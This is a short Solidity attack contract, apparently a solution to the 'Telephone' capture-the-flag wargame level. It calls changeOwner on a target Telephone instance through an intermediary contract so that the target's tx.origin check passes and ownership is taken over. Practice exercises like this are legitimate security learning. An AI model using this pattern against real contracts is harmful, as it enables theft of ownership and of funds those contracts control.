// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// instance address 
// 0x481Aa2ACAe832925f20cefA45032FE70e17e7254


import"./Telephone.sol";

contract TeleAttack {

    Telephone teleOriginal;

    constructor(address _address) public {
        teleOriginal = Telephone(_address);
    }

    function hackTelephone(address _address) public {
        teleOriginal.changeOwner(_address);
    }
}